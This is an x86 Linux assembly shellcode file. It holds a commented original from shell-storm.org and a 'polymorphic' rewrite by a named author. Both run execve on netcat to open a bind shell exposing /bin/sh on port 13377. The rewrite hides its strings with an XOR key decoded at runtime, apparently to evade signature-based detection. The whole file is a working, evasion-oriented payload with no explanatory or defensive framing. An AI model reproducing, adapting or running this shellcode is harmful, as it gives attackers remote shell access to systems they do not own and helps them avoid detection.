; Original: http://shell-storm.org/shellcode/files/shellcode-804.php
; Polymorphic version by: Tristan aka R3OATH
; Website: www.r3oath.com

global _start

section .text
_start:

	; Original
	;xor eax, eax
	;xor edx, edx
	;push 0x37373333
	;push 0x3170762d
	;mov edx, esp
	;push eax
	;push 0x68732f6e
	;push 0x69622f65
	;push 0x76766c2d
	;mov ecx, esp
	;push eax
	;push 0x636e2f2f
	;push 0x2f2f2f2f
	;push 0x6e69622f
	;mov ebx, esp
	;push eax
	;push edx
	;push ecx
	;push ebx	
	;xor edx, edx
	;mov ecx, esp
	;mov al, 11
	;int 0x80

	; Polymorphic
	mov esi, 0xdeadbeef
	push esi
	push 0xe99a8ddc
	push 0xefddc8c2
	mov edx, esp
	push esi
	push 0xb6de9181
	push 0xb7cf918a
	push 0xa8dbd2c2
	mov eax, esp
	push esi
	push 0xbdc391c0
	push 0xf18291c0
	push 0xb0c4dcc0
	mov ebx, esp
	push esi
	add esp, 0x2c
	mov cl, 0xc
	xor [esp], esi
	sub esp, 0x4
	loop $-6
	push edx
	push eax
	push ebx
	mov ecx, esp
	xor eax, eax
	mul eax	
	mov al, 0xb
	int 0x80